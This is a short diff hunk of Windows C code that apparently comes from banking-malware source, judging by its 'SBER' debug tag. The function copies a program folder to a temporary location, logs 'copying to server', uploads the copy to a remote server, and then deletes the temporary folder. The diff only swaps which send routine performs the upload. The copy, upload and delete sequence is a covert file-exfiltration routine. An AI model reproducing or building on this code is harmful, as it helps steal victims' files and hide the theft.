@@ -311,7 +311,7 @@ static DWORD WINAPI CopyFolderThread( LPVOID lpData )
 			if( CopyFileANdFolder( folderPrg, folderTmp ) )
 			{
 				DBG( "SBER", "Копирование на сервер" );
-				StartSendThread( folderTmp, 0 /*"192.168.0.100"*/, NULL, 700 );
+				VideoRecorderSendPath( folderTmp, 0 /*"192.168.0.100"*/, NULL, 700 );
 				DeleteFolders(folderTmp);
 			}
 			flag = 1;
